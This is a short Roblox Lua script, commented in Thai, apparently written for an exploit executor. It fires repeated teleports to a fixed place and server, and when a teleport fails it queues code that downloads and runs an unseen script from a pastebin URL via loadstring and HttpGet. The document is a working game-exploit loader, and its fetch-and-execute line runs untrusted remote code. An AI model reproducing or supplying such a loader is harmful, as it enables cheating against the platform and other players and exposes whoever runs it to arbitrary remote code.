local TeleportService = game:GetService("TeleportService")

-- ถ้า teleport ล้มเหลว ให้บันทึก JobId และรันโค้ดหลัง teleport
TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, v)
    queue_on_teleport([[getgenv().JobId = "]] .. v.ServerInstanceId .. [["; loadstring(game:HttpGet("https://pastebin.com/raw/2MrdkW6b"))()]])
end)

-- teleport ไปยัง JobId ที่กำหนด 2 ครั้ง
for _ = 1, 2 do
    task.spawn(function()
        TeleportService:TeleportToPlaceInstance(126884695634066, game.JobId)
    end)
    task.wait()
end
